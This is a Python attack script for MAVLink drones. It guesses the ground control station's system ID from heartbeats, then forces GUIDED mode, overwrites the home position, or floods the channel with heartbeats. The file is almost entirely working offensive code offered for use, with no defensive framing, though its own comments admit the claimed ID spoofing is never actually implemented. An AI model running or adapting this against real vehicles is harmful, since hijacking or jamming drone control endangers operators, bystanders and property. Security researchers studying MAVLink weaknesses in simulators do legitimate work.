#!/usr/bin/env python3
"""
Ground Control Station Spoofing Exploit Script
Spoofs GCS system ID to impersonate legitimate ground station and override commands
"""

import sys
import time
from pymavlink import mavutil

def identify_gcs(connection):
    """
    Identify legitimate GCS system ID from heartbeat messages
    
    Args:
        connection: MAVLink connection object
    
    Returns:
        GCS system ID or None
    """
    print("[*] Listening for GCS heartbeat messages...")
    
    gcs_systems = {}
    start_time = time.time()
    timeout = 10  # Listen for 10 seconds
    
    while time.time() - start_time < timeout:
        msg = connection.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
        if msg:
            system_id = msg.get_srcSystem()
            autopilot = msg.autopilot
            
            # GCS typically has autopilot type MAV_AUTOPILOT_INVALID or specific GCS types
            # In practice, GCS often uses system_id 255 or other high values
            if system_id not in gcs_systems:
                gcs_systems[system_id] = {
                    'autopilot': autopilot,
                    'count': 0
                }
            gcs_systems[system_id]['count'] += 1
            print(f"[*] Detected system ID {system_id} (autopilot: {autopilot})")
    
    if not gcs_systems:
        print("[-] No GCS systems detected")
        return None
    
    # Find most common system ID (likely the GCS)
    most_common = max(gcs_systems.items(), key=lambda x: x[1]['count'])
    gcs_id = most_common[0]
    
    print(f"[+] Identified GCS system ID: {gcs_id}")
    return gcs_id

def spoof_gcs(connection, target_system, spoofed_system_id, command_type='override'):
    """
    Spoof GCS by creating connection with spoofed system ID
    
    Args:
        connection: Original MAVLink connection
        target_system: Target drone system ID
        spoofed_system_id: System ID to spoof (GCS ID)
        command_type: Type of attack ('override', 'inject', 'block')
    """
    print(f"[*] Spoofing GCS with system ID: {spoofed_system_id}")
    print(f"[*] Target system: {target_system}")
    print(f"[*] Attack type: {command_type}")
    
    # Create new connection with spoofed system ID
    # Note: pymavlink doesn't directly support system ID spoofing in connection string
    # We'll need to manually set the source system ID in messages
    
    if command_type == 'override':
        # Override legitimate commands by sending commands with higher priority
        print("[*] Sending override commands...")
        
        # Example: Force GUIDED mode
        connection.mav.set_mode_send(
            target_system,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            4  # GUIDED mode
        )
        print("[+] Override command sent (GUIDED mode)")
        
    elif command_type == 'inject':
        # Inject malicious commands
        print("[*] Injecting malicious commands...")
        
        # Example: Change home position
        connection.mav.command_long_send(
            target_system,
            connection.target_component,
            mavutil.mavlink.MAV_CMD_DO_SET_HOME,
            0,  # Confirmation
            1,  # Use current location
            0, 0, 0, 0, 0, 0, 0  # Parameters
        )
        print("[+] Injected home position change command")
        
    elif command_type == 'block':
        # Block legitimate commands by flooding
        print("[*] Flooding channel to block legitimate commands...")
        for i in range(100):
            connection.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS,
                mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                0, 0, 0
            )
        print("[+] Channel flooded")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 gcs_spoofing.py <connection> [spoofed_system_id] [command_type]")
        print("\nArguments:")
        print("  connection         MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  spoofed_system_id  System ID to spoof (default: auto-detect)")
        print("  command_type       Type of attack: override, inject, or block (default: override)")
        print("\nExamples:")
        print("  python3 gcs_spoofing.py udp:127.0.0.1:14550")
        print("  python3 gcs_spoofing.py udp:127.0.0.1:14550 255")
        print("  python3 gcs_spoofing.py udp:127.0.0.1:14550 255 inject")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    spoofed_system_id = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else None
    command_type = sys.argv[3] if len(sys.argv) > 3 else 'override'
    
    if command_type not in ['override', 'inject', 'block']:
        print(f"[-] Invalid command type: {command_type}")
        print("[*] Valid types: override, inject, block")
        sys.exit(1)
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    target_system = connection.target_system
    
    # Identify GCS if not specified
    if spoofed_system_id is None:
        spoofed_system_id = identify_gcs(connection)
        if spoofed_system_id is None:
            print("[!] Could not identify GCS, using default system ID 255")
            spoofed_system_id = 255
    
    # Perform GCS spoofing attack
    spoof_gcs(connection, target_system, spoofed_system_id, command_type)
    print("[+] GCS spoofing attack completed")

if __name__ == "__main__":
    main()
